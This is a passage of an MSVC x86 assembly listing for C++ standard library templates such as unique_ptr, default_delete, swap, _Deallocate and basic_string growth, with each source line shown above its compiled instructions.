  0001b	e8 00 00 00 00	 call	 ??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
  00020	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00023	8b e5		 mov	 esp, ebp
  00025	5d		 pop	 ebp
  00026	c2 04 00	 ret	 4
??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ PROC ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first, COMDAT
; _this$ = ecx

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1531 :         return *this;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1532 :     }

  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ ENDP ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -4						; size = 4
?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release, COMDAT
; _this$ = ecx

; 3277 :     _CONSTEXPR23 pointer release() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3278 :         return _STD exchange(_Mypair._Myval2, nullptr);

  00009	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR $T1[ebp], 0
  00010	8d 45 fc	 lea	 eax, DWORD PTR $T1[ebp]
  00013	50		 push	 eax
  00014	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	51		 push	 ecx
  00018	e8 00 00 00 00	 call	 ??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z ; std::exchange<std::_Facet_base *,std::nullptr_t>
  0001d	83 c4 08	 add	 esp, 8

; 3279 :     }

  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c3		 ret	 0
?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ
_TEXT	SEGMENT
tv77 = -12						; size = 4
tv75 = -8						; size = 4
_this$ = -4						; size = 4
??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >, COMDAT
; _this$ = ecx

; 3247 :     _CONSTEXPR23 ~unique_ptr() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3248 :         if (_Mypair._Myval2) {

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 38 00	 cmp	 DWORD PTR [eax], 0
  0000f	74 1f		 je	 SHORT $LN2@unique_ptr

; 3249 :             _Mypair._Get_first()(_Mypair._Myval2);

  00011	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00014	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
  00019	89 45 f4	 mov	 DWORD PTR tv77[ebp], eax
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	8b 11		 mov	 edx, DWORD PTR [ecx]
  00021	89 55 f8	 mov	 DWORD PTR tv75[ebp], edx
  00024	8b 45 f8	 mov	 eax, DWORD PTR tv75[ebp]
  00027	50		 push	 eax
  00028	8b 4d f4	 mov	 ecx, DWORD PTR tv77[ebp]
  0002b	e8 00 00 00 00	 call	 ??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z ; std::default_delete<std::_Facet_base>::operator()
$LN2@unique_ptr:

; 3250 :         }
; 3251 :     }

  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c3		 ret	 0
??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ ENDP ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z
_TEXT	SEGMENT
_this$ = -16						; size = 4
tv72 = -12						; size = 4
tv71 = -8						; size = 4
$T1 = -4						; size = 4
__Ptr$ = 8						; size = 4
??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z PROC ; std::default_delete<std::_Facet_base>::operator(), COMDAT
; _this$ = ecx

; 3137 :     _CONSTEXPR23 void operator()(_Ty* _Ptr) const noexcept /* strengthened */ { // delete a pointer

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f0	 mov	 DWORD PTR _this$[ebp], ecx

; 3138 :         static_assert(0 < sizeof(_Ty), "can't delete an incomplete type");
; 3139 :         delete _Ptr;

  00009	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  0000f	83 7d fc 00	 cmp	 DWORD PTR $T1[ebp], 0
  00013	74 17		 je	 SHORT $LN3@operator
  00015	8b 4d fc	 mov	 ecx, DWORD PTR $T1[ebp]
  00018	8b 11		 mov	 edx, DWORD PTR [ecx]
  0001a	8b 02		 mov	 eax, DWORD PTR [edx]
  0001c	89 45 f8	 mov	 DWORD PTR tv71[ebp], eax
  0001f	6a 01		 push	 1
  00021	8b 4d fc	 mov	 ecx, DWORD PTR $T1[ebp]
  00024	ff 55 f8	 call	 DWORD PTR tv71[ebp]
  00027	89 45 f4	 mov	 DWORD PTR tv72[ebp], eax
  0002a	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  0002c	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR tv72[ebp], 0
$LN4@operator:

; 3140 :     }

  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c2 04 00	 ret	 4
??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z ENDP ; std::default_delete<std::_Facet_base>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z
_TEXT	SEGMENT
__Obj$ = 8						; size = 4
??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z PROC		; std::_Destroy_in_place<char *>, COMDAT

; 307  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();
; 312  :     }
; 313  : }

  00003	5d		 pop	 ebp
  00004	c3		 ret	 0
??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z ENDP		; std::_Destroy_in_place<char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@PA_W@std@@YAXAAPA_W@Z
_TEXT	SEGMENT
__Obj$ = 8						; size = 4
??$_Destroy_in_place@PA_W@std@@YAXAAPA_W@Z PROC		; std::_Destroy_in_place<wchar_t *>, COMDAT

; 307  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();
; 312  :     }
; 313  : }

  00003	5d		 pop	 ebp
  00004	c3		 ret	 0
??$_Destroy_in_place@PA_W@std@@YAXAAPA_W@Z ENDP		; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Obj$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ??$addressof@PA_W@std@@YAPAPA_WAAPA_W@Z ; std::addressof<wchar_t *>
  0000d	83 c4 04	 add	 esp, 4
  00010	50		 push	 eax
  00011	6a 04		 push	 4
  00013	e8 00 00 00 00	 call	 ??2@YAPAXIPAX@Z		; operator new
  00018	83 c4 08	 add	 esp, 8
  0001b	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  0001e	8b 4d 0c	 mov	 ecx, DWORD PTR _<_Args_0>$[ebp]
  00021	51		 push	 ecx
  00022	e8 00 00 00 00	 call	 ??$forward@ABQA_W@std@@YAABQA_WABQA_W@Z ; std::forward<wchar_t * const &>
  00027	83 c4 04	 add	 esp, 4
  0002a	8b 55 fc	 mov	 edx, DWORD PTR $T1[ebp]
  0002d	8b 00		 mov	 eax, DWORD PTR [eax]
  0002f	89 02		 mov	 DWORD PTR [edx], eax

; 256  :     }
; 257  : }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$swap@PAU_Dir_enum_impl@filesystem@std@@$0A@@std@@YAXAAPAU_Dir_enum_impl@filesystem@0@0@Z
_TEXT	SEGMENT
__Tmp$ = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$swap@PAU_Dir_enum_impl@filesystem@std@@$0A@@std@@YAXAAPAU_Dir_enum_impl@filesystem@0@0@Z PROC ; std::swap<std::filesystem::_Dir_enum_impl *,0>, COMDAT

; 128  :     is_nothrow_move_constructible_v<_Ty>&& is_nothrow_move_assignable_v<_Ty>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 129  :     _Ty _Tmp = _STD move(_Left);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z ; std::move<std::filesystem::_Dir_enum_impl * &>
  0000d	83 c4 04	 add	 esp, 4
  00010	8b 08		 mov	 ecx, DWORD PTR [eax]
  00012	89 4d fc	 mov	 DWORD PTR __Tmp$[ebp], ecx

; 130  :     _Left    = _STD move(_Right);

  00015	8b 55 0c	 mov	 edx, DWORD PTR __Right$[ebp]
  00018	52		 push	 edx
  00019	e8 00 00 00 00	 call	 ??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z ; std::move<std::filesystem::_Dir_enum_impl * &>
  0001e	83 c4 04	 add	 esp, 4
  00021	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  00024	8b 10		 mov	 edx, DWORD PTR [eax]
  00026	89 11		 mov	 DWORD PTR [ecx], edx

; 131  :     _Right   = _STD move(_Tmp);

  00028	8d 45 fc	 lea	 eax, DWORD PTR __Tmp$[ebp]
  0002b	50		 push	 eax
  0002c	e8 00 00 00 00	 call	 ??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z ; std::move<std::filesystem::_Dir_enum_impl * &>
  00031	83 c4 04	 add	 esp, 4
  00034	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00037	8b 10		 mov	 edx, DWORD PTR [eax]
  00039	89 11		 mov	 DWORD PTR [ecx], edx

; 132  : }

  0003b	8b e5		 mov	 esp, ebp
  0003d	5d		 pop	 ebp
  0003e	c3		 ret	 0
??$swap@PAU_Dir_enum_impl@filesystem@std@@$0A@@std@@YAXAAPAU_Dir_enum_impl@filesystem@0@0@Z ENDP ; std::swap<std::filesystem::_Dir_enum_impl *,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Deallocate@$07$0A@@std@@YAXPAXI@Z
_TEXT	SEGMENT
__Ptr$ = 8						; size = 4
__Bytes$ = 12						; size = 4
??$_Deallocate@$07$0A@@std@@YAXPAXI@Z PROC		; std::_Deallocate<8,0>, COMDAT

; 255  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 256  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 257  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 258  :     if (_STD is_constant_evaluated()) {
; 259  :         ::operator delete(_Ptr);
; 260  :     } else
; 261  : #endif // _HAS_CXX20
; 262  :     {
; 263  : #if defined(_M_IX86) || defined(_M_X64)
; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00003	81 7d 0c 00 10
	00 00		 cmp	 DWORD PTR __Bytes$[ebp], 4096 ; 00001000H
  0000a	72 10		 jb	 SHORT $LN2@Deallocate

; 265  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);

  0000c	8d 45 0c	 lea	 eax, DWORD PTR __Bytes$[ebp]
  0000f	50		 push	 eax
  00010	8d 4d 08	 lea	 ecx, DWORD PTR __Ptr$[ebp]
  00013	51		 push	 ecx
  00014	e8 00 00 00 00	 call	 ?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z ; std::_Adjust_manually_vector_aligned
  00019	83 c4 08	 add	 esp, 8
$LN2@Deallocate:

; 266  :         }
; 267  : #endif // defined(_M_IX86) || defined(_M_X64)
; 268  :         ::operator delete(_Ptr, _Bytes);

  0001c	8b 55 0c	 mov	 edx, DWORD PTR __Bytes$[ebp]
  0001f	52		 push	 edx
  00020	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00023	50		 push	 eax
  00024	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00029	83 c4 08	 add	 esp, 8

; 269  :     }
; 270  : }

  0002c	5d		 pop	 ebp
  0002d	c3		 ret	 0
??$_Deallocate@$07$0A@@std@@YAXPAXI@Z ENDP		; std::_Deallocate<8,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$swap@PAV_Ref_count_base@std@@$0A@@std@@YAXAAPAV_Ref_count_base@0@0@Z
_TEXT	SEGMENT
__Tmp$ = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$swap@PAV_Ref_count_base@std@@$0A@@std@@YAXAAPAV_Ref_count_base@0@0@Z PROC ; std::swap<std::_Ref_count_base *,0>, COMDAT

; 128  :     is_nothrow_move_constructible_v<_Ty>&& is_nothrow_move_assignable_v<_Ty>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 129  :     _Ty _Tmp = _STD move(_Left);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z ; std::move<std::_Ref_count_base * &>
  0000d	83 c4 04	 add	 esp, 4
  00010	8b 08		 mov	 ecx, DWORD PTR [eax]
  00012	89 4d fc	 mov	 DWORD PTR __Tmp$[ebp], ecx

; 130  :     _Left    = _STD move(_Right);

  00015	8b 55 0c	 mov	 edx, DWORD PTR __Right$[ebp]
  00018	52		 push	 edx
  00019	e8 00 00 00 00	 call	 ??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z ; std::move<std::_Ref_count_base * &>
  0001e	83 c4 04	 add	 esp, 4
  00021	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  00024	8b 10		 mov	 edx, DWORD PTR [eax]
  00026	89 11		 mov	 DWORD PTR [ecx], edx

; 131  :     _Right   = _STD move(_Tmp);

  00028	8d 45 fc	 lea	 eax, DWORD PTR __Tmp$[ebp]
  0002b	50		 push	 eax
  0002c	e8 00 00 00 00	 call	 ??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z ; std::move<std::_Ref_count_base * &>
  00031	83 c4 04	 add	 esp, 4
  00034	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00037	8b 10		 mov	 edx, DWORD PTR [eax]
  00039	89 11		 mov	 DWORD PTR [ecx], edx

; 132  : }

  0003b	8b e5		 mov	 esp, ebp
  0003d	5d		 pop	 ebp
  0003e	c3		 ret	 0
??$swap@PAV_Ref_count_base@std@@$0A@@std@@YAXAAPAV_Ref_count_base@0@0@Z ENDP ; std::swap<std::_Ref_count_base *,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Obj$ = 8						; size = 4
_<_Args_0>$ = 12					; size = 4
??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z PROC	; std::_Construct_in_place<char *,char * &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Obj$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ??$addressof@PAD@std@@YAPAPADAAPAD@Z ; std::addressof<char *>
  0000d	83 c4 04	 add	 esp, 4
  00010	50		 push	 eax
  00011	6a 04		 push	 4
  00013	e8 00 00 00 00	 call	 ??2@YAPAXIPAX@Z		; operator new
  00018	83 c4 08	 add	 esp, 8
  0001b	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  0001e	8b 4d 0c	 mov	 ecx, DWORD PTR _<_Args_0>$[ebp]
  00021	51		 push	 ecx
  00022	e8 00 00 00 00	 call	 ??$forward@AAPAD@std@@YAAAPADAAPAD@Z ; std::forward<char * &>
  00027	83 c4 04	 add	 esp, 4
  0002a	8b 55 fc	 mov	 edx, DWORD PTR $T1[ebp]
  0002d	8b 00		 mov	 eax, DWORD PTR [eax]
  0002f	89 02		 mov	 DWORD PTR [edx], eax

; 256  :     }
; 257  : }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z ENDP	; std::_Construct_in_place<char *,char * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
_<_Args_1>$ = 20					; size = 4
??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
